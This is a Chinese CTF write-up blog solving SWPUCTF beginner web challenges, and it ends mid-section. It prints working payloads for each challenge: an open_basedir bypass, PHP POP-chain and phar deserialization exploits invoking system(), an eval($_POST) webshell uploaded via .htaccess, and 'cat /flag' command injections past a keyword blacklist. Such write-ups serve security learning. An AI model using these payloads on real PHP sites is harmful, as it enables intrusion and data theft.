<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">'test'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'test'</span>); <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'/flag'</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//拿到flag</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310161450280.png" alt="image-20240310161450280"></p>
<h1 id="swpuctf-2022-新生赛ez_1zpop">[SWPUCTF 2022 新生赛]ez_1zpop</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dxg</span></span>
<span class="hljs-class"></span>{
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fmm</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-keyword">return</span> <span class="hljs-string">"nonono"</span>;
   }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lt</span></span>
<span class="hljs-class"></span>{
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$impo</span>=<span class="hljs-string">'hi'</span>;
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$md51</span>=<span class="hljs-string">'weclome'</span>;
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$md52</span>=<span class="hljs-string">'to NSS'</span>;
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-variable language_">$this</span>-&gt;impo = <span class="hljs-keyword">new</span> dxg;
   }
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-variable language_">$this</span>-&gt;impo = <span class="hljs-keyword">new</span> dxg;
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;impo-&gt;<span class="hljs-title function_ invoke__">fmm</span>();
   }

   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md51) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md52) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;md51 != <span class="hljs-variable language_">$this</span>-&gt;md52)
         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;impo-&gt;<span class="hljs-title function_ invoke__">fmm</span>();
   }
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>;
   }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span>
<span class="hljs-class"></span>{
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">'https://www.ctfer.vip'</span>;
   <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fmm</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>{
      <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;a;
      <span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;title);
   }
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NSS'</span>])) {
   <span class="hljs-variable">$Data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NSS'</span>]);
} <span class="hljs-keyword">else</span> {
   <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);
}</code></pre>
<p>简单的链子</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dxg</span></span>
<span class="hljs-class"></span>{
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lt</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$impo</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md51</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md52</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lt</span>();
<span class="hljs-variable">$pop</span>-&gt;impo = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fin</span>();
<span class="hljs-variable">$pop</span>-&gt;md51 = <span class="hljs-string">'QNKCDZO'</span>;
<span class="hljs-variable">$pop</span>-&gt;md52 = <span class="hljs-string">'240610708'</span>;
<span class="hljs-variable">$pop</span>-&gt;impo-&gt;a = <span class="hljs-string">'system'</span>;
<span class="hljs-variable">$pop</span>-&gt;impo-&gt;title = <span class="hljs-string">'ls /'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310211459155.png" alt="image-20240310211459155"></p>
<h1 id="swpuctf-2022-新生赛funny_web">[SWPUCTF 2022 新生赛]funny_web</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311183646287.png" alt="image-20240311183646287"></p>
<p>这里提示账户是实验室名字：NSS，密码是群里某位成员的QQ，管理员全尝试一次就行了：2122693401</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])) {
    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> != <span class="hljs-string">'12345'</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) == <span class="hljs-string">'12345'</span>) {
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"这为何相等又不相等"</span>;
    }
}</code></pre>
<p>简单的PHP特性，可以换进制绕过、小数点、数学计算法、二次取反等等：12345a</p>
<h1 id="swpuctf-2022-新生赛ez_upload">[SWPUCTF 2022 新生赛]Ez_upload</h1>
<p>文件上传，这里是过滤了php后缀的ph，那畸形后缀名绕过就别想了。之后上传正常的jpg发现还是不对，就尴尬了，我寻思都很正常，看了wp发现，那个提示就是单纯的检测文件内容而已。搞得我有点晕</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185536689.png" alt="image-20240311185536689"></p>
<p>这里的其他类型我以为就是mime的类型不对或者是后缀被过滤了。也反映出来分析文件上传的思路就不行，且上传正常jpg就应该注意内容的正常与否，需要一步步排除，不让就如同我一样，不知道过滤了什么</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185647009.png" alt="image-20240311185647009"></p>
<p>这里更换正常内容，就成功上传，显然就是利用.htaccess文件了，但又限制文件内容，翻一下笔记</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185803235.png" alt="image-20240311185803235"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185809454.png" alt="image-20240311185809454"></p>
<p>正好，那直接上就对了</p>
<pre><code class="hljs scss">AddType application/x-httpd-php <span class="hljs-selector-class">.bcx</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185902055.png" alt="image-20240311185902055"></p>
<p>先成功让其解析bcx文件，接着上传</p>
<pre><code class="hljs scss">&lt;script language="php"&gt;<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]);&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190025065.png" alt="image-20240311190025065"></p>
<p>上传后，发现flag在env中</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190219520.png" alt="image-20240311190219520"></p>
<h1 id="swpuctf-2023-秋季新生赛if_else">[SWPUCTF 2023 秋季新生赛]If_else</h1>
<pre><code class="hljs php">某一天,NSSCTF给了你一次机会,让你来自定义<span class="hljs-keyword">if</span>中的条件,提交后访问check.php查看结果

提交方式<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"check"</span>]

记得访问一下check.php哦~

check.php的内容

<span class="hljs-meta">&lt;?php</span>
    <span class="hljs-variable">$a</span>=<span class="hljs-literal">false</span>;
    <span class="hljs-variable">$b</span>=<span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span>(你提交的部分将会被写至这里)
    {<span class="hljs-variable">$a</span>=<span class="hljs-literal">true</span>;}
    <span class="hljs-keyword">else</span>
    {<span class="hljs-variable">$b</span>=<span class="hljs-literal">true</span>;}
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>===<span class="hljs-literal">true</span>&amp;&amp;<span class="hljs-variable">$b</span>===<span class="hljs-literal">true</span>)
    <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(cat /flag));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里分析一波就可以知道，根本不可能绕过if语句，我也是陷误区了，当时还想着是否可以闭合来执行命令，但没成功，看了wp才知道我构造就错了。两种方法：</p>
<p>一个是if条件里面通过eval直接就可以执行命令，且能回显出来？？？这里有点不懂，先记下来吧</p>
<pre><code class="hljs scss">check=<span class="hljs-built_in">eval</span>(system('cat /flag'))</code></pre>
<p>一个是通过闭合：check=1) eval(system(‘cat /flag’));/*</p>
<p>这里我当时没成功就是用的是//，这种只能注释一行，显然不行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311192317024.png" alt="image-20240311192317024"></p>
<h1 id="swpuctf-2021-新生赛babyunser">[SWPUCTF 2021 新生赛]babyunser</h1>
<p>这里刚开始给了上传文件与读取文件功能。因为他直接将文件后缀改为了 txt，webshell就别想了，尝试了半天，我突然想到目录穿越，不过过滤了…/，之后又想到伪协议，幸运地是file没过滤，直接就能读取到主目录下的文件了</p>
<p>读取了read.php与upload.php发现还存在class.php，代码如下</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">'aa'</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;name);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-string">"\&lt;?php @eval(\$_POST[1]);?&gt;"</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;{<span class="hljs-variable language_">$this</span>-&gt;func}(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>]); <span class="hljs-comment">//cmd=ls等等</span>
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">'surprise'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^\/|php:|data|zip|\.\.\//i'</span>,<span class="hljs-variable">$this</span>-&gt;filename)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'这不合理'</span>);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>{
        <span class="hljs-variable">$filename</span>=<span class="hljs-variable language_">$this</span>-&gt;filename;
        <span class="hljs-variable">$lt</span>=<span class="hljs-variable language_">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;
        <span class="hljs-comment">//此功能废弃，不想写了</span>
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();
        <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);
        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>)){
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"404 not found"</span>);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;{<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'method'</span>]}(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'var'</span>]);  <span class="hljs-comment">//method=write;var=content</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;content;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">'eval'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;arg=<span class="hljs-string">'phpinfo();'</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>{
        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);
    }
}</code></pre>
<p>其中read.php代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311194527648.png" alt="image-20240311194527648"></p>
<p>可以看到这里调用了getfile函数，我们跟踪一下会发现，该函数存在<code>file_get_contents</code>方法，再结合文件上传，不难想到phar反序列化了，接下来就先构造链子，在构造phar文件</p>
<p>不过这里先说一个误区，当时我看到文件里面有众多需要post传参的参数，我就蒙了，我想着怎么在构造链子的时候进行post传参啊，结果就不会了，看了wp发现。如果我们上传了phar文件，当访问的时候，他会进行反序列化，此时我们可以在读取页面进行post传参即可。</p>
<p>直接看链子aa类-》aa类.name-》zz类.tostring-》zz类.write-》ff类.get-》xx类.call</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">'system'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xx</span>(); <span class="hljs-comment">//注意content的赋值</span>
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;
}

<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span>
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();
<span class="hljs-variable">$pop</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>();
<span class="hljs-variable">$pop</span>-&gt;name-&gt;filename = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ff</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>最终上传文件后，用phar读取文件即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311201853066.png" alt="image-20240311201853066"></p>
<h1 id="swpuctf-2023-秋季新生赛rce-plus">[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i"</span>, <span class="hljs-variable">$cmd</span>)){
        <span class="hljs-keyword">return</span>(<span class="hljs-variable">$cmd</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"i hate this"</span>);      
      }
}
<span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];
<span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$cmd</span>);
<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$cmd</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>无回显RCE，幸运地是没禁用tee，直接配合ls将内容重定向到文件即可：<code>cmd=cat /f*| tee 1.txt</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311203334975.png" alt="image-20240311203334975"></p>
<h1 id="swpuctf-2023-秋季新生赛pingpingping">[SWPUCTF 2023 秋季新生赛]Pingpingping</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$_ping</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'Ping_ip.exe'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_ping</span>)){
    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">"ping -c 3 "</span>.<span class="hljs-variable">$_ping</span>);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"error.png"</span>));
